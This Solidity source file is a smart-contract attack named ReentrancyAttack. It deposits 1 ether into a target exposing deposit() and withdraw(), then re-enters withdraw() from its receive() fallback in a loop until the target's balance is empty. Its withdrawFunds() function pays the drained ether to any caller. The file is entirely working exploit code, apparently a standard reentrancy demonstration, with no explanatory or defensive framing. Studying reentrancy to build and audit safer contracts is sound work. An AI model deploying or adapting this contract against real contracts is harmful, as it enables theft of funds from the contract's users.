// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IReentrancyVulnerable public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IReentrancyVulnerable(_vulnerableContract);
    }

    receive() external payable {
        while (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function withdrawFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}